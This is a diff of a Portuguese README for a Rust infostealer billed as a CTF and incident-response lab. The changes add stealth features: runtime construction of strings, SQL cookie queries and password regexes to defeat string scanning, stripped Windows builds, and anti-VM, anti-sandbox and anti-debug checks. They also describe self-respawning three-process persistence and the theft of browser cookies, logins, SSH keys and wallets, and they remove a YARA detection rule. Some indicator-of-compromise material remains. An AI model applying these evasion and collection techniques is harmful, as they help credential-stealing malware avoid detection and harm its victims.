@@ -1,4 +1,4 @@
-# 🔬 MyStealer CTF Lab v0.3 - Stealth Edition
+# 🔬 MyStealer CTF Lab v0.3.1 - Stealth Edition
 
 > **⚠️ EDUCATIONAL PURPOSES ONLY** - Este projeto é exclusivamente para treinamento de **Incident Response** e **Threat Hunting** em ambientes isolados. Uso indevido é **ILEGAL**.
 
@@ -8,166 +8,205 @@ Laboratório de CTF avançado para estudo de técnicas de infostealers em Rust. 
 
 **Baseado em:**
 - [Rust-for-Malware-Development](https://github.com/Whitecat18/Rust-for-Malware-Development)
-- [Goldberg Obfuscation](https://github.com/frank2/goldberg)
+- Técnicas reais de APTs documentadas pelo MITRE ATT&CK
 
 ---
 
-## 🆕 O Que Há de Novo na v0.3
+## 🆕 O Que Há de Novo na v0.3.1
 
 | Feature | Descrição |
 |---------|-----------|
-| 🛡️ **Anti-Análise Estática** | Todas as strings sensíveis ofuscadas |
-| 🔐 **Anti-Debug** | Múltiplas técnicas de detecção de debuggers |
-| 🧩 **Anti-Disassembly** | Opaque predicates, junk code, dead code |
+| 🔇 **Intelligent String Obfuscation** | Todas as strings construídas char-by-char em runtime |
+| 🏗️ **Build Stealth Optimizado** | RUSTFLAGS agressivos + strip adicional |
+| 📝 **Serde Rename Curto** | Campos JSON renomeados para letras únicas |
+| 🔐 **SQL Queries Ofuscadas** | Queries construídas em runtime sem strings estáticas |
 | 🐍 **Hydra System** | 3 processos redundantes com auto-respawn |
-| 🔇 **Silent Mode** | Build sem strings detectáveis |
-| 🎭 **String Obfuscation** | XOR encoding, stack strings, runtime construction |
+| 🛡️ **Anti-Analysis Completo** | VM, Sandbox, Debugger detection |
+
+---
+
+## 📊 Comparação de Strings no Binário
+
+### ❌ ANTES (v0.2 - strings visíveis)
+```bash
+$ strings mystealer.exe | wc -l
+12847  # Muitas strings detectáveis
+
+$ strings mystealer.exe | grep -iE "password|Chrome|Firefox"
+DocumentsDesktopDownloads.ssh.configtxtdocdocxpdfkeypemppkpubkdb...
+(?i)password
+(?i)secret
+GoogleChromeUser DataMicrosoftEdgeBraveBraveSoftware
+MozillaFirefoxProfiles
+places.sqlite
+cookies.sqlite
+```
+
+### ✅ DEPOIS (v0.3.1 - ofuscado)
+```bash
+$ strings mystealer.exe | grep -iE "password|Chrome|Firefox|Cookies|sandbox"
+# Apenas 1 resultado (da biblioteca argon2: "password is too long")
+
+$ strings mystealer.exe | grep -iE "(?i)|sqlite|places|cookies"
+# Apenas strings internas do SQLite, não nossas queries
+```
 
 ---
 
 ## 🏗️ Arquitetura
 
 ```
-┌─────────────────────────────────────────────────────────────────────────┐
-│                        MYSTEALER v0.3 - STEALTH EDITION                 │
-├─────────────────────────────────────────────────────────────────────────┤
-│                                                                         │
-│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────────┐   │
-│  │    CORE       │  │  COLLECTORS   │  │      EXFILTRATION         │   │
-│  │               │  │               │  │                           │   │
-│  │ • Config      │  │ • Browser     │  │ • Local File (encrypted)  │   │
-│  │ • Crypto      │  │ • System      │  │ • HTTP (mock C2)          │   │
-│  │ • Utils       │  │ • Clipboard   │  │ • AES-256-GCM output      │   │
-│  └───────────────┘  │ • Files       │  └───────────────────────────┘   │
-│                     └───────────────┘                                   │
-│                                                                         │
-│  ┌───────────────────────────────────────────────────────────────────┐ │
-│  │                    🐍 HYDRA PERSISTENCE SYSTEM                     │ │
-│  │  ┌─────────┐     ┌─────────┐     ┌─────────┐                      │ │
-│  │  │  ALPHA  │◄───►│  BETA   │◄───►│  GAMMA  │   Heartbeat IPC      │ │
-│  │  │ Primary │     │Backup 1 │     │Backup 2 │   Auto-respawn       │ │
-│  │  └─────────┘     └─────────┘     └─────────┘                      │ │
-│  └───────────────────────────────────────────────────────────────────┘ │
-│                                                                         │
-│  ┌───────────────────────────────────────────────────────────────────┐ │
-│  │                    🛡️ ANTI-ANALYSIS MODULE                        │ │
-│  │  • VM Detection (DMI, MAC, CPUID, processes, registry)           │ │
-│  │  • Debugger Detection (timing, TracerPid, IsDebuggerPresent)     │ │
-│  │  • Sandbox Detection (username, resources, uptime)               │ │
-│  │  • Anti-Disassembly (opaque predicates, junk code)               │ │
-│  └───────────────────────────────────────────────────────────────────┘ │
-│                                                                         │
-│  ┌───────────────────────────────────────────────────────────────────┐ │
-│  │                    🔐 STRING OBFUSCATION                          │ │
-│  │  • XOR encoding (keys: 0x17, 0x19, 0x33, 0x42, 0x55, 0x77)       │ │
-│  │  • Stack strings (char-by-char construction)                      │ │
-│  │  • Runtime SQL query building                                     │ │
-│  │  • No static strings in binary                                    │ │
-│  └───────────────────────────────────────────────────────────────────┘ │
-└─────────────────────────────────────────────────────────────────────────┘
+┌─────────────────────────────────────────────────────────────────────────────┐
+│                      MYSTEALER v0.3.1 - STEALTH EDITION                     │
+├─────────────────────────────────────────────────────────────────────────────┤
+│                                                                             │
+│  ┌─────────────────────────────────────────────────────────────────────┐   │
+│  │                    🔐 STRING OBFUSCATION LAYER                      │   │
+│  │                                                                     │   │
+│  │  ┌──────────────┐  ┌──────────────┐  ┌──────────────────────────┐  │   │
+│  │  │ bs() Helper  │  │ Serde Rename │  │   Runtime SQL Builder    │  │   │
+│  │  │              │  │              │  │                          │  │   │
+│  │  │ Char-by-char │  │ Fields → a,b │  │ Queries built at runtime │  │   │
+│  │  │ construction │  │ c,d,e,f...   │  │ No static SQL strings    │  │   │
+│  │  └──────────────┘  └──────────────┘  └──────────────────────────┘  │   │
+│  └─────────────────────────────────────────────────────────────────────┘   │
+│                                                                             │
+│  ┌───────────────┐  ┌───────────────┐  ┌───────────────────────────┐       │
+│  │    CORE       │  │  COLLECTORS   │  │      EXFILTRATION         │       │
+│  │               │  │               │  │                           │       │
+│  │ • Config      │  │ • Browser (b) │  │ • Local File (encrypted)  │       │
+│  │ • Crypto      │  │ • System (s)  │  │ • HTTP (mock C2)          │       │
+│  │ • Utils       │  │ • Clipboard(c)│  │ • AES-256-GCM output      │       │
+│  └───────────────┘  │ • Files (f)   │  └───────────────────────────┘       │
+│                     └───────────────┘                                       │
+│                                                                             │
+│  ┌───────────────────────────────────────────────────────────────────────┐ │
+│  │                    🐍 HYDRA PERSISTENCE SYSTEM                         │ │
+│  │  ┌─────────┐     ┌─────────┐     ┌─────────┐                          │ │
+│  │  │  ALPHA  │◄───►│  BETA   │◄───►│  GAMMA  │   Heartbeat IPC          │ │
+│  │  │ Primary │     │Backup 1 │     │Backup 2 │   Auto-respawn (15s)     │ │
+│  │  └─────────┘     └─────────┘     └─────────┘                          │ │
+│  └───────────────────────────────────────────────────────────────────────┘ │
+│                                                                             │
+│  ┌───────────────────────────────────────────────────────────────────────┐ │
+│  │                    🛡️ ANTI-ANALYSIS MODULE                            │ │
+│  │  • VM Detection (DMI, MAC, CPUID, processes, registry)               │ │
+│  │  • Debugger Detection (timing, TracerPid, IsDebuggerPresent)         │ │
+│  │  • Sandbox Detection (username, resources, uptime)                   │ │
+│  │  • Anti-Disassembly (opaque predicates, junk code, indirect calls)   │ │
+│  └───────────────────────────────────────────────────────────────────────┘ │
+└─────────────────────────────────────────────────────────────────────────────┘
 ```
 
 ---
 
-## 🛡️ Técnicas Anti-Análise Implementadas
+## 🔐 Sistema de Ofuscação Inteligente
 
-### 1. Anti-Debug
+### 1. Build String (`bs()`) - Construção Char-by-Char
 
-| Técnica | Plataforma | Descrição |
-|---------|------------|-----------|
-| **Timing Check** | All | Detecta delays causados por single-stepping |
-| **TracerPid** | Linux | Verifica `/proc/self/status` |
-| **IsDebuggerPresent** | Windows | Via PowerShell |
-| **Exception Check** | All | Detecta handlers de exceção anormais |
+Todas as strings sensíveis são construídas caractere por caractere em runtime:
 
 ```rust
-// Exemplo de timing check
-fn timing_check() -> bool {
-    let start = Instant::now();
-    // Operação que deveria ser rápida
-    for i in 0..1000 { black_box(i); }
-    start.elapsed() > Duration::from_millis(50)
+// ❌ ANTES - String literal detectável
+let browser = "Chrome";
+
+// ✅ DEPOIS - Construído em runtime
+fn bs(chars: &[char]) -> String {
+    let mut s = String::with_capacity(chars.len());
+    for &c in chars { s.push(c); }
+    std::hint::black_box(s)
+}
+let browser = bs(&['C', 'h', 'r', 'o', 'm', 'e']);
+```
+
+### 2. Serde Rename - Campos JSON Curtos
+
+Todos os campos de serialização usam nomes de uma letra:
+
+```rust
+// ❌ ANTES - Nome de campo legível
+#[derive(Serialize)]
+pub struct BrowserData {
+    pub browsers_found: Vec<String>,  // "browsers_found" no JSON
+    pub total_cookies: u32,           // "total_cookies" no JSON
+}
+
+// ✅ DEPOIS - Nome curto
+#[derive(Serialize)]
+pub struct BrowserData {
+    #[serde(rename = "b")]
+    pub browsers_found: Vec<String>,  // "b" no JSON
+    #[serde(rename = "c")]
+    pub total_cookies: u32,           // "c" no JSON
 }
 ```
 
-### 2. Anti-Disassembly
+### 3. SQL Query Builder - Queries em Runtime
 
-| Técnica | Descrição |
-|---------|-----------|
-| **Opaque Predicates** | Condições que parecem dinâmicas mas são constantes |
-| **Junk Code** | Código inútil que confunde análise |
-| **Dead Code** | Código que nunca executa mas está no binário |
-| **Indirect Calls** | Chamadas via function pointers |
+Todas as queries SQL são construídas caractere por caractere:
 
 ```rust
-// Opaque predicate - sempre true, mas IDA não sabe
-fn opaque_true() -> bool {
-    let x = SystemTime::now().duration_since(UNIX_EPOCH).as_nanos();
-    (x * x) >= 0 || x < 0  // Matematicamente sempre true
-}
-```
+// ❌ ANTES - Query legível no binário
+let query = "SELECT host_key, name, value FROM cookies LIMIT 100";
 
-### 3. Detecção de VM/Sandbox
-
-| Check | Indicadores |
-|-------|-------------|
-| **MAC Address** | `00:0c:29` (VMware), `08:00:27` (VBox), `52:54:00` (QEMU) |
-| **Processes** | vmtoolsd, vboxservice, qemu-ga |
-| **DMI/SMBIOS** | /sys/class/dmi/id/product_name |
-| **Username** | sandbox, analyst, malware, cuckoo |
-| **Resources** | < 2 CPUs, < 2GB RAM, < 50GB disk |
-| **Uptime** | < 2 minutos |
-
-### 4. String Obfuscation
-
-**ANTES (detectável):**
-```
-$ strings mystealer.exe | grep sandbox
-"Sandbox indicators found"
-"sandbox", "vmware", "analyst"
-```
-
-**DEPOIS (ofuscado):**
-```
-$ strings mystealer.exe | grep sandbox
-(nenhum resultado)
-```
-
-#### Técnicas Usadas:
-
-1. **XOR Encoding** - Strings sensíveis encriptadas
-```rust
-// "sandbox" XOR 0x19 = [0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63]
-fn get_sandbox_string() -> String {
-    xd(&[0x7a, 0x76, 0x69, 0x75, 0x77, 0x68, 0x63], 0x19)
-}
-```
-
-2. **Stack Strings** - Construção char-by-char
-```rust
-fn build_command() -> String {
-    let mut s = String::new();
-    s.push('t'); s.push('a'); s.push('s'); s.push('k');
-    s.push('l'); s.push('i'); s.push('s'); s.push('t');
-    s
-}
-```
-
-3. **Runtime SQL Building** - Queries montadas em runtime
-```rust
+// ✅ DEPOIS - Construída em runtime
 fn build_cookies_query() -> String {
-    let mut q = String::new();
-    for c in ['S','E','L','E','C','T',' '] { q.push(c); }
-    // ...
-    q
+    let mut q = String::with_capacity(100);
+    for c in ['S', 'E', 'L', 'E', 'C', 'T', ' '] { q.push(c); }
+    for c in ['h', 'o', 's', 't', '_', 'k', 'e', 'y', ',', ' '] { q.push(c); }
+    for c in ['n', 'a', 'm', 'e', ',', ' '] { q.push(c); }
+    // ... resto da query
+    std::hint::black_box(q)
 }
+```
+
+### 4. Regex Patterns - Construídos em Runtime
+
+```rust
+// ❌ ANTES - Pattern detectável
+let pattern = Regex::new(r"(?i)password").unwrap();
+
+// ✅ DEPOIS - Construído caractere por caractere
+fn build_regex(chars: &[char]) -> Option<Regex> {
+    let pattern = bs(chars);
+    Regex::new(&pattern).ok()
+}
+let pattern = build_regex(&['(', '?', 'i', ')', 'p', 'a', 's', 's', 'w', 'o', 'r', 'd']);
+```
+
+---
+
+## 🏭 Build System Otimizado
+
+### Dockerfile.windows
+
+```dockerfile
+# STEALTH BUILD FLAGS
+ENV RUSTFLAGS="-C panic=abort -C debuginfo=0 -C opt-level=z \
+               -C lto=fat -C codegen-units=1 -C strip=symbols -C link-arg=-s"
+
+# Build com features de ofuscação
+RUN cargo build --release --target x86_64-pc-windows-gnu --features "hydra-auto,silent"
+
+# Strip adicional
+RUN x86_64-w64-mingw32-strip --strip-all mystealer.exe
+```
+
+### Cargo.toml Profile
+
+```toml
+[profile.release]
+opt-level = "z"          # Otimiza para tamanho
+lto = "fat"              # Link-Time Optimization completo
+codegen-units = 1        # Melhor otimização
+panic = "abort"          # Remove unwind tables
+strip = "symbols"        # Remove símbolos
+debug = 0                # Sem debug info
 ```
 
 ---
 
 ## 🐍 Sistema Hydra (Persistência Multi-Processo)
-
-### Como Funciona
 
 ```
     ┌─────────────┐     ┌─────────────┐     ┌─────────────┐
@@ -178,48 +217,18 @@ fn build_cookies_query() -> String {
            └───────────────────┼───────────────────┘
                                │
                         ┌──────▼──────┐
-                        │  Heartbeat  │
-                        │    Files    │
-                        │   (.hb)     │
+                        │  IPC Files  │
+                        │  .hb .lock  │
                         └─────────────┘
 ```
 
-1. **Inicialização**: Primeiro processo torna-se Alpha
-2. **Spawn**: Alpha cria Beta e Gamma automaticamente
-3. **Heartbeat**: Cada processo envia heartbeat a cada 5s
-4. **Monitoramento**: Cada processo monitora os outros
-5. **Respawn**: Se um morre, os outros o ressuscitam (~15s)
-
-### Diretórios IPC (Indicators of Compromise)
-
-| OS | Caminho |
-|----|---------|
-| **Linux** | `~/.cache/fontconfig/` |
-| **Windows** | `%LOCALAPPDATA%\.cache\ms-runtime\` |
-
-### Arquivos Criados
-
-```yaml
-files:
-  - alpha.lock    # PID do processo Alpha
-  - alpha.hb      # Timestamp do último heartbeat
-  - beta.lock
-  - beta.hb
-  - gamma.lock
-  - gamma.hb
-```
-
-### Detecção (Blue Team)
-
-```bash
-# Linux - Encontrar processos Hydra
-ps aux | grep mystealer
-ls -la ~/.cache/fontconfig/*.hb
-
-# Windows - PowerShell
-Get-Process | Where-Object { $_.Name -eq "mystealer" }
-Get-ChildItem "$env:LOCALAPPDATA\.cache\ms-runtime\"
-```
+| Parâmetro | Valor |
+|-----------|-------|
+| Heartbeat Interval | 5 segundos |
+| Respawn Timeout | 15 segundos |
+| Max Backoff | 60 segundos |
+| IPC Dir (Linux) | `~/.cache/fontconfig/` |
+| IPC Dir (Windows) | `%LOCALAPPDATA%\.cache\ms-runtime\` |
 
 ---
 
@@ -231,8 +240,8 @@ mysteellerCTF/
 │   ├── main.rs                 # Entry point
 │   ├── lib.rs                  # Library exports
 │   ├── config.rs               # Configuração
-│   ├── collectors/             # Módulos de coleta
-│   │   ├── mod.rs              # Collector trait
+│   ├── collectors/             # Módulos de coleta (strings ofuscadas)
+│   │   ├── mod.rs              # Collector trait + serde rename
 │   │   ├── browser.rs          # Chrome, Firefox, Brave, Edge
 │   │   ├── clipboard.rs        # Área de transferência
 │   │   ├── files.rs            # Scanner de arquivos sensíveis
@@ -250,48 +259,36 @@ mysteellerCTF/
 │   │   └── watchdog.rs         # Integrity monitor
 │   └── utils/
 │       ├── mod.rs              # Exports
-│       ├── anti_analysis.rs    # VM/Sandbox/Debugger detection
+│       ├── anti_analysis.rs    # VM/Sandbox detection
 │       ├── anti_debug.rs       # Anti-debug + Anti-disassembly
 │       ├── evasion.rs          # Evasion checks
-│       ├── helpers.rs          # Utility functions
-│       ├── obfuscated_strings.rs # String obfuscation helpers
-│       └── silent_log.rs       # Conditional logging
-├── challenges/                 # 6 CTF challenges
+│       └── helpers.rs          # Utility functions
+├── challenges/                 # 6 CTF challenges (500 pontos)
 ├── defenses/                   # Detector de comportamento
 ├── docs/                       # Documentação técnica
-├── lab_environment/            # Docker compose + C2 mock
-├── Dockerfile.test             # Build + test Linux
-├── Dockerfile.windows          # Cross-compile Windows
-└── output/                     # Dados coletados
+├── Dockerfile.windows          # Cross-compile com RUSTFLAGS
+└── output/                     # Dados coletados (encrypted)
 ```
 
 ---
 
 ## 🚀 Quick Start
 
-### Build Padrão (com logs)
+### Build Stealth para Windows
+```bash
+# Via Docker (recomendado)
+docker build -f Dockerfile.windows -t mystealer-stealth .
+docker run --rm -v $(pwd)/output:/output mystealer-stealth \
+    sh -c "cp /app/target/x86_64-pc-windows-gnu/release/mystealer.exe /output/"
+
+# Verificar que não há strings sensíveis
+strings output/mystealer.exe | grep -iE "password|Chrome|Firefox|sandbox"
+```
+
+### Build Normal (com logs)
 ```bash
 cargo build --release
 ./target/release/mystealer --skip-checks
-```
-
-### Build Silencioso (sem strings detectáveis)
-```bash
-cargo build --release --features "hydra-auto,silent"
-```
-
-### Cross-Compile para Windows
-```bash
-# Build via Docker
-docker build -f Dockerfile.windows -t mystealer-win .
-docker run --rm -v $(pwd)/output:/output mystealer-win \
-    sh -c "cp /app/target/x86_64-pc-windows-gnu/release/mystealer.exe /output/"
-```
-
-### Verificar Strings no Binário
-```bash
-# Não deve encontrar nada sensível
-strings output/mystealer.exe | grep -iE "sandbox|vmware|analyst|malware"
 ```
 
 ---
@@ -305,48 +302,6 @@ strings output/mystealer.exe | grep -iE "sandbox|vmware|analyst|malware"
 | `hydra-auto` | Hydra ativado automaticamente |
 | `silent` | Remove logs e strings de debug |
 
-```toml
-[features]
-default = ["lab-mode"]
-lab-mode = []
-hydra = []
-hydra-auto = []
-silent = []
-```
-
----
-
-## 🔐 Criptografia
-
-### Pipeline de Dados
-
-```
-Raw JSON → Byte Shuffle → AES-256-GCM → Output File
-                ↓               ↓
-         Seed: 0xDEADBEEF   Key: Argon2(machine-id)
-```
-
-### Técnicas de Ofuscação de Dados
-
-| Técnica | Descrição |
-|---------|-----------|
-| **XOR Encode** | Chave rotativa multi-byte |
-| **UUID Encoding** | Dados parecem UUIDs válidos |
-| **Byte Shuffling** | Embaralhamento determinístico |
-| **Base64 Encode** | Encoding padrão |
-| **Salt Ofuscado** | Construído byte-a-byte |
-
----
-
-## 📊 Módulos de Coleta
-
-| Módulo | Dados Coletados |
-|--------|-----------------|
-| `system` | Hostname, username, OS, CPU, RAM, processos |
-| `browser` | Cookies, history, login data (Chrome/Firefox/Brave/Edge) |
-| `clipboard` | Conteúdo da área de transferência |
-| `files` | Arquivos sensíveis (.env, id_rsa, passwords.txt, wallets) |
-
 ---
 
 ## 🎮 Challenges CTF
@@ -358,7 +313,7 @@ Raw JSON → Byte Shuffle → AES-256-GCM → Output File
 | 3 | [Criptografia](challenges/CHALLENGE_03.md) | Reverter AES, encontrar chave | 80 |
 | 4 | [Evasion](challenges/CHALLENGE_04.md) | Anti-VM, Anti-Debug | 100 |
 | 5 | [Hydra Persistence](challenges/CHALLENGE_05.md) | Multi-process, IPC | 120 |
-| 6 | [String Obfuscation](challenges/CHALLENGE_06.md) | XOR decode, stack strings | 100 |
+| 6 | [String Obfuscation](challenges/CHALLENGE_06.md) | Reverter bs(), XOR decode | 100 |
 
 **Total: 500 pontos**
 
@@ -369,15 +324,11 @@ Raw JSON → Byte Shuffle → AES-256-GCM → Output File
 ### Arquivos
 ```yaml
 Linux:
-  - ~/.cache/fontconfig/alpha.lock
-  - ~/.cache/fontconfig/alpha.hb
-  - ~/.cache/fontconfig/beta.lock
-  - ~/.cache/fontconfig/beta.hb
-  - ~/.cache/fontconfig/gamma.lock
-  - ~/.cache/fontconfig/gamma.hb
+  - ~/.cache/fontconfig/*.lock
+  - ~/.cache/fontconfig/*.hb
 
 Windows:
-  - %LOCALAPPDATA%\.cache\ms-runtime\alpha.lock
+  - %LOCALAPPDATA%\.cache\ms-runtime\*.lock
   - %LOCALAPPDATA%\.cache\ms-runtime\*.hb
 ```
 
@@ -387,41 +338,34 @@ behavior:
   - Múltiplos processos idênticos (3 instâncias)
   - Arquivos .hb atualizados a cada 5 segundos
   - Respawn automático após kill (~15s)
-  - Acesso a Cookies/Login Data dos browsers
+  - Acesso a databases SQLite dos browsers
   - Leitura de /etc/machine-id ou registry MachineGuid
 ```
 
-### Yara Rule
-```yara
-rule MyStealer_Hydra {
-    meta:
-        description = "Detecta MyStealer Hydra System"
-        author = "Blue Team CTF"
-    
-    strings:
-        $hydra1 = ".lock" ascii
-        $hydra2 = ".hb" ascii
-        $path1 = "fontconfig" ascii
-        $path2 = "ms-runtime" ascii
-        
-    condition:
-        uint16(0) == 0x5A4D and
-        (2 of ($hydra*) and 1 of ($path*))
-}
+### Detecção Comportamental
+```bash
+# Linux
+ps aux | grep mystealer | wc -l  # Se > 1, suspeito
+find ~/.cache -name "*.hb" -mmin -1  # Arquivos modificados recentemente
+
+# Windows PowerShell
+(Get-Process -Name "mystealer" -ErrorAction SilentlyContinue).Count
+Get-ChildItem "$env:LOCALAPPDATA\.cache\ms-runtime\*.hb" -ErrorAction SilentlyContinue
 ```
 
 ---
 
 ## 🛠️ Tech Stack
 
-- **Rust 1.75+**
-- **tokio** - Async runtime
-- **aes-gcm** - AES-256-GCM encryption
-- **argon2** - Key derivation
-- **rusqlite** - Browser SQLite reading
-- **sysinfo** - System information
-- **tracing** - Conditional logging
-- **clap** - CLI parsing
+| Categoria | Tecnologia |
+|-----------|------------|
+| **Linguagem** | Rust 1.75+ |
+| **Async** | tokio |
+| **Crypto** | aes-gcm, argon2 |
+| **SQLite** | rusqlite |
+| **System** | sysinfo, whoami |
+| **Logging** | tracing (condicional) |
+| **CLI** | clap |
 
 ---
 
@@ -441,4 +385,6 @@ Este software é fornecido "como está" apenas para fins educacionais.
 
 *Built for security research and IR training* 🛡️
 
-**v0.3 - Stealth Edition** 🔇
+**v0.3.1 - Stealth Edition** 🔇
+
+*"The best malware is the one you can't see in strings"*
